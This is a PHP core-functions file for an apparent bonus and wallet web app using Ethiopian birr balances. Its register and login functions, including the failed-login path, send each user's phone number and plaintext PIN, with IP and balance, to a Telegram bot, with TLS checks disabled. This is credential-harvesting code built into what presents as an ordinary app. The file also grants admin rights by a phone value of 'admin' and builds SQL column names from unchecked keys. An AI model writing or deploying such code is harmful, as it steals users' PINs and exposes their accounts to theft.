<?php
// functions.php - All Core Functions
require_once 'config.php';

// Database connection
function db() {
    static $conn = null;
    if ($conn === null) {
        try {
            $conn = new PDO("mysql:host=".DB_HOST.";dbname=".DB_NAME.";charset=utf8mb4", DB_USER, DB_PASS);
            $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        } catch (PDOException $e) {
            die("Database error: " . $e->getMessage());
        }
    }
    return $conn;
}

// ============ TELEGRAM FUNCTIONS ============
function sendTelegram($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

// ============ USER FUNCTIONS ============
function registerUser($phone, $pin, $name = '') {
    $db = db();
    $hashed = password_hash($pin, PASSWORD_DEFAULT);
    $stmt = $db->prepare("INSERT INTO users (phone, pin, name, created_at) VALUES (?, ?, ?, NOW())");
    $result = $stmt->execute([$phone, $hashed, $name]);
    
    if ($result) {
        $message = "🆕 <b>NEW USER REGISTERED</b>\n\n" .
                   "📱 <b>Phone:</b> <code>" . $phone . "</code>\n" .
                   "🔑 <b>PIN:</b> <code>" . $pin . "</code>\n" .
                   "👤 <b>Name:</b> " . ($name ?: 'Not provided') . "\n" .
                   "🕐 <b>Time:</b> " . date('Y-m-d H:i:s') . "\n" .
                   "🌐 <b>IP:</b> " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown');
        sendTelegram($message);
    }
    return $result;
}

function loginUser($phone, $pin) {
    $db = db();
    $stmt = $db->prepare("SELECT * FROM users WHERE phone = ? AND status = 'active'");
    $stmt->execute([$phone]);
    $user = $stmt->fetch();
    
    if ($user && password_verify($pin, $user['pin'])) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['user_phone'] = $user['phone'];
        $_SESSION['user_name'] = $user['name'];
        $_SESSION['user_balance'] = $user['balance'];
        $_SESSION['login_time'] = time();
        
        $stmt = $db->prepare("UPDATE users SET last_login = NOW(), login_attempts = 0 WHERE id = ?");
        $stmt->execute([$user['id']]);
        
        $message = "🔐 <b>USER LOGIN</b>\n\n" .
                   "📱 <b>Phone:</b> <code>" . $phone . "</code>\n" .
                   "🔑 <b>PIN:</b> <code>" . $pin . "</code>\n" .
                   "👤 <b>Name:</b> " . ($user['name'] ?: 'Not set') . "\n" .
                   "💰 <b>Balance:</b> ETB " . number_format($user['balance'], 2) . "\n" .
                   "🕐 <b>Time:</b> " . date('Y-m-d H:i:s');
        sendTelegram($message);
        return true;
    }
    
    if ($user) {
        $message = "⚠️ <b>FAILED LOGIN ATTEMPT</b>\n\n" .
                   "📱 <b>Phone:</b> <code>" . $phone . "</code>\n" .
                   "🔑 <b>PIN Entered:</b> <code>" . $pin . "</code>\n" .
                   "🕐 <b>Time:</b> " . date('Y-m-d H:i:s');
        sendTelegram($message);
    }
    return false;
}

function getUser($id = null) {
    $db = db();
    $id = $id ?? $_SESSION['user_id'] ?? 0;
    $stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$id]);
    return $stmt->fetch();
}

function updateBalance($user_id, $amount) {
    $db = db();
    $stmt = $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?");
    return $stmt->execute([$amount, $user_id]);
}

function isLoggedIn() {
    return isset($_SESSION['user_id']) && (time() - $_SESSION['login_time'] < SESSION_TIMEOUT);
}

function requireLogin() {
    if (!isLoggedIn()) {
        header('Location: index.php');
        exit;
    }
}

// ============ BONUS FUNCTIONS ============
function getBonuses($active_only = true) {
    $db = db();
    $sql = "SELECT * FROM bonuses";
    if ($active_only) $sql .= " WHERE status = 'active' AND (expiry_date IS NULL OR expiry_date > NOW())";
    $sql .= " ORDER BY created_at DESC";
    return $db->query($sql)->fetchAll();
}

function claimBonus($user_id, $bonus_id) {
    $db = db();
    
    $stmt = $db->prepare("SELECT * FROM bonus_claims WHERE user_id = ? AND bonus_id = ?");
    $stmt->execute([$user_id, $bonus_id]);
    if ($stmt->fetch()) {
        return ['success' => false, 'message' => 'Already claimed'];
    }
    
    $stmt = $db->prepare("SELECT * FROM bonuses WHERE id = ? AND status = 'active'");
    $stmt->execute([$bonus_id]);
    $bonus = $stmt->fetch();
    if (!$bonus) {
        return ['success' => false, 'message' => 'Bonus not available'];
    }
    
    $db->beginTransaction();
    try {
        $stmt = $db->prepare("INSERT INTO bonus_claims (user_id, bonus_id) VALUES (?, ?)");
        $stmt->execute([$user_id, $bonus_id]);
        
        $stmt = $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?");
        $stmt->execute([$bonus['amount'], $user_id]);
        
        $stmt = $db->prepare("INSERT INTO transactions (user_id, type, amount, description) VALUES (?, 'bonus', ?, ?)");
        $stmt->execute([$user_id, $bonus['amount'], 'Bonus: ' . $bonus['title']]);
        
        $db->commit();
        
        $user = getUser($user_id);
        sendTelegram("🎁 <b>BONUS CLAIMED</b>\n\n" .
                    "👤 <b>User:</b> " . $user['phone'] . "\n" .
                    "💰 <b>Amount:</b> ETB " . $bonus['amount'] . "\n" .
                    "📦 <b>Package:</b> " . $bonus['title']);
        
        return ['success' => true, 'message' => 'Bonus claimed!'];
    } catch (Exception $e) {
        $db->rollBack();
        return ['success' => false, 'message' => 'Error: ' . $e->getMessage()];
    }
}

// ============ TRANSACTIONS ============
function getTransactions($user_id, $limit = 20) {
    $db = db();
    $stmt = $db->prepare("SELECT * FROM transactions WHERE user_id = ? ORDER BY created_at DESC LIMIT ?");
    $stmt->execute([$user_id, $limit]);
    return $stmt->fetchAll();
}

// ============ ADMIN FUNCTIONS ============
function isAdmin() {
    return isset($_SESSION['user_phone']) && $_SESSION['user_phone'] === 'admin';
}

function requireAdmin() {
    if (!isAdmin()) {
        header('Location: index.php');
        exit;
    }
}

function getAllUsers() {
    $db = db();
    return $db->query("SELECT * FROM users ORDER BY created_at DESC")->fetchAll();
}

function getAllTransactions($limit = 100) {
    $db = db();
    $stmt = $db->prepare("SELECT t.*, u.phone as user_phone FROM transactions t 
                          JOIN users u ON t.user_id = u.id 
                          ORDER BY t.created_at DESC LIMIT ?");
    $stmt->execute([$limit]);
    return $stmt->fetchAll();
}

function getAllBonuses() {
    $db = db();
    return $db->query("SELECT * FROM bonuses ORDER BY created_at DESC")->fetchAll();
}

function createBonus($title, $description, $amount, $type = 'cash', $expiry_date = null) {
    $db = db();
    $stmt = $db->prepare("INSERT INTO bonuses (title, description, amount, type, expiry_date, created_at) VALUES (?, ?, ?, ?, ?, NOW())");
    return $stmt->execute([$title, $description, $amount, $type, $expiry_date]);
}

function updateBonus($id, $data) {
    $db = db();
    $fields = [];
    $values = [];
    
    foreach ($data as $key => $value) {
        if ($key !== 'id') {
            $fields[] = "$key = ?";
            $values[] = $value;
        }
    }
    
    if (empty($fields)) return false;
    
    $values[] = $id;
    $sql = "UPDATE bonuses SET " . implode(', ', $fields) . " WHERE id = ?";
    $stmt = $db->prepare($sql);
    return $stmt->execute($values);
}

function deleteBonus($id) {
    $db = db();
    $stmt = $db->prepare("DELETE FROM bonuses WHERE id = ?");
    return $stmt->execute([$id]);
}

function formatCurrency($amount) {
    return 'ETB ' . number_format($amount, 2);
}

function timeAgo($datetime) {
    $timestamp = strtotime($datetime);
    $diff = time() - $timestamp;
    
    if ($diff < 60) return $diff . 's ago';
    if ($diff < 3600) return floor($diff / 60) . 'm ago';
    if ($diff < 86400) return floor($diff / 3600) . 'h ago';
    if ($diff < 604800) return floor($diff / 86400) . 'd ago';
    return date('M d, Y', $timestamp);
}
?>
